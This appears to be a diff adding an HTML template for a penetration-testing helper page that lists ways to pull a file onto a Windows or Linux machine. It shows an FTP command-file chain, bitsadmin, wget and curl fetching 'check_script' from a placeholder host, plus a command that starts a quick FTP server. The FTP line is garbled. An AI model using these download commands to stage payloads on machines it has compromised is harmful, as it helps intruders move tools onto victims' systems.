@@ -1,0 +1,19 @@
+{% extends "base.html" %}
+{% block content %}
+    <div>
+      <p>
+        Windows <br><br>
+
+        echo open host_address &gt ftp_commands.txt & echo anonymous &gt&gt ftp_commands.txt &gt echo password >> ftp_commands.txt &gt echo binary > >ftp_commands.txt &gt echo get check_script &gt&gt ftp_commands.txt & echo bye &gt&gt ftp_commands.txt & ftp -s:ftp_commands.txt
+        bitsadmin /transfer wcb /priority high http://address C:\downloads\examplefile.pdf <br>
+
+        Linux<br><br>
+        wget http://host_address/check_script<br>
+        curl -L http://host_address/check_script<br>
+
+
+        python -m pyftpdlib -p 21
+        {{ textfield }} <br>
+      </p>
+    </div>
+{% endblock %}
